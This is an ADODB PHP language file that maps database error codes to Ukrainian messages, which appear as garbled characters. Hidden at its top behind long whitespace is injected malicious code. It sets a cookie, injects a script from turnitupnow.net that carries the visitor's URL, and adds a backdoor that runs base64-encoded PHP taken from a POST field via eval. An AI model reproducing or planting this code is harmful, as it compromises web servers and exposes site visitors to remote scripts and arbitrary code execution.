<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


// Ukrainian language file contributed by  Alex Rootoff rootoff{AT}pisem.net.

$ADODB_LANG_ARRAY = array (
             'LANG'                      => 'uk1251',
            DB_ERROR                    => '������� �������',
            DB_ERROR_ALREADY_EXISTS     => '��� ����',
            DB_ERROR_CANNOT_CREATE      => '��������� ��������',
            DB_ERROR_CANNOT_DELETE      => '��������� ��������',
            DB_ERROR_CANNOT_DROP        => '��������� ������� (drop)',
            DB_ERROR_CONSTRAINT         => '��������� ���� ��������',
            DB_ERROR_DIVZERO            => '������ �� 0',
            DB_ERROR_INVALID            => '�����������',
            DB_ERROR_INVALID_DATE       => '����������� ���� �� ���',
            DB_ERROR_INVALID_NUMBER     => '����������� �����',
            DB_ERROR_MISMATCH           => '�������',
            DB_ERROR_NODBSELECTED       => '�� ������� ��',
            DB_ERROR_NOSUCHFIELD        => '�� ���� ����',
            DB_ERROR_NOSUCHTABLE        => '�� ���� �������',
            DB_ERROR_NOT_CAPABLE        => '���� �� � ����',
            DB_ERROR_NOT_FOUND          => '�� ��������',
            DB_ERROR_NOT_LOCKED         => '�� �����������',
            DB_ERROR_SYNTAX             => '����������� �������',
            DB_ERROR_UNSUPPORTED        => '�� �����������',
            DB_ERROR_VALUE_COUNT_ON_ROW => '�������� ������� � ������',
            DB_ERROR_INVALID_DSN        => '����������� DSN',
            DB_ERROR_CONNECT_FAILED     => '�\'������� ��������',
            0                               => '��� ������', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => '������ ����������� �����',
            DB_ERROR_EXTENSION_NOT_FOUND=> '���������� �� ��������',
            DB_ERROR_NOSUCHDB           => '�� ���� ��',
            DB_ERROR_ACCESS_VIOLATION   => '����������� ���� �������'
);
?>